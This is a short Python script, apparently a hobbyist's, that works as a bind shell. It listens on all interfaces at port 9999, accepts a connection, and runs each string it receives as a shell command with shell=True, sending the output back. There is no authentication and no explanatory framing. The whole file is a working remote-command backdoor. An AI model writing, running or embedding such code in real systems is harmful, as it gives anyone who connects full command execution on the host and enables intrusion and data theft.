import socket
import subprocess
import os

HOST = "0.0.0.0"
PORT = 9999

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

connection, address = server.accept()

while True:
	resposta = connection.recv(2048)
	#subprocess.call(resposta.decode("utf-8"), shell=True, universal_newlines=True)
	processo = subprocess.check_output(resposta.decode("utf-8"), shell=True, universal_newlines=True)
	connection.sendall(processo.encode("utf-8"))

connection.close()
server.close()